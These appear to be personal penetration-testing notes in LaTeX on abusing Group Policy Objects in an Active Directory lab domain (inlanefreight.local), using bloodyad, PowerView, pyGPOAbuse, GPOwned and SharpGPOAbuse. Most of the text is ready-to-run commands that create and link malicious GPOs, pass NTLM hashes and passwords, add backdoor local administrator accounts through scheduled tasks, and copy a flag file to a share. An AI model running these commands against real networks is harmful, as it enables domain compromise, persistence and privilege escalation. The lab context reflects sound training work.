
\section{Tools}

\subsection{bloodyad}

don't work (not shown in mmc) but when New-GPLink get error already linked
\begin{verbatim}
bloodyad --host 172.19.99.10 \ 
    -d inlanefreight.local \ 
    -u tangui -p :bb73d5056f1f2084e5b5bbe18261f6b6 \ 
    -v INFO   \ 
    set object \ 
    -v '[LDAP://CN={2931CE97-C81F-40D5-8DCD-53763D4567D2},CN=Policies,CN=System,DC=inlanefreight,DC=local;0]' \ 
    "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=inlanefreight,DC=local"  \ 
    gPLink
\end{verbatim}


\subsection{Powersploit}

\href{https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1}{older version from the PowerSploit repository}

Note: edit the scheduled task of the GPO in settings to set "Run a new instance in parallel"
\begin{verbatim}
$gpo = "Backdoor"
New-GPO $gpo
Import-Module .\PowerView_2.ps1
New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" `
    -Command C:\Windows\System32\cmd.exe `
    -CommandArguments "/c net user backdoor B@ckdoor123 /add"

New-GPLink -Name "Backdoor" -Target $DN
\end{verbatim}

\subsection{pyGPOAbuse}
\href{https://github.com/Hackndo/pyGPOAbuse}{pyGPOAbuse} Python partial implementation of SharpGPOAbuse. It can only modify an existing gpo.

first backup or create a gpo with \verb+GPOwned.py+ 
\begin{verbatim}
pygpoabuse.py <domain_fqdn>/<user>:<password> \
    -gpo-id gpo_cn \
    -command "<payload>" \
    -taskname "<name>" -description "<desc>" \
    -dc-ip <dc_fqdn> -v

pygpoabuse.py inlanefreight.local/gabriel:Godisgood001 \
    -gpo-id EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D \
    -command "net user plaintext Password1234 /add && net localgroup Administrators plaintext /add" \
    -taskname "PT_LocalAdmin" -description "this is a GPO test" \
    -dc-ip 172.16.92.10 -v

pygpoabuse.py \
    -gpo-id "122ABCEA-3B55-42E1-BF2C-061ADFC73F7D" \
    -powershell \
    -command 'cp C:\Users\Administrator\Desktop\flag.txt "\\sde01\shared\$($env:computername).txt"' \
    -taskname "jubeaz" \
    -description "pwn ta face" \
    -f -dc-ip 172.19.99.10 \
    inlanefreight.local/angel:Ilovebaseball01
\end{verbatim}

finaly link gpo with \verb+GPOwned.py+

\subsection{GPOwned}
\href{https://github.com/X-C3LL/GPOwned}{GPOwned}

\begin{verbatim}
GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 \
    -gpcmachine -listgpo

GPOwned.py -u gabriel -p Godisgood001 -d inlanefreight.local -dc-ip 172.16.92.10 \
    -gpcmachine -listgplink
\end{verbatim}


backup
\begin{verbatim}
python3 GPOwned.py -u <user> -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn> \
    -gpcmachine -backup <backup_name> -name "{<gpo_cn>}"
\end{verbatim}
       
Create: 
\begin{verbatim}
    python3 GPOwned.py \
    -u tangui -hashes :bb73d5056f1f2084e5b5bbe18261f6b6 \
    -d inlanefreight.local -dc-ip 172.19.99.10 \
    -gpcmachine -creategpo -name jubeaz -comment "jubeaz"
\end{verbatim}

link gpo:
\begin{verbatim}
    python3 GPOwned.py \
    -u tangui -hashes :bb73d5056f1f2084e5b5bbe18261f6b6 \
    -d inlanefreight.local -dc-ip 172.19.99.10 \
    -gpcmachine  \
    -linkgpotosite \
    -name "jubeaz" \
    -sitename Default-First-Site-Name
\end{verbatim}
    

\subsection{SharpGPOAbuse}

\href{https://github.com/FSecureLABS/SharpGPOAbuse}{SharpGPOAbuse} is a \verb+.NET+ application written in \verb+C#+ that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO

\begin{verbatim}
--AddUserRights 	Add rights to a user
--AddLocalAdmin 	Add a user to the local admins group (Overwrite any existing Administrator)
--AddComputerScript 	Add a new computer startup script
--AddUserScript 	Configure a user logon script
--AddComputerTask 	Configure a computer immediate task
--AddUserTask 	Add an immediate task to a user
\end{verbatim}

\begin{verbatim}
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gabriel --GPOName "Default Security Policy - WKS"
cat "\\inlanefreight.local\SysVol\inlanefreight.local\Policies\{EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
\end{verbatim}

{\bf Note:  \verb+--AddLocalAdmin+ option will overwrite any existing Administrator if this policy is given higher priority}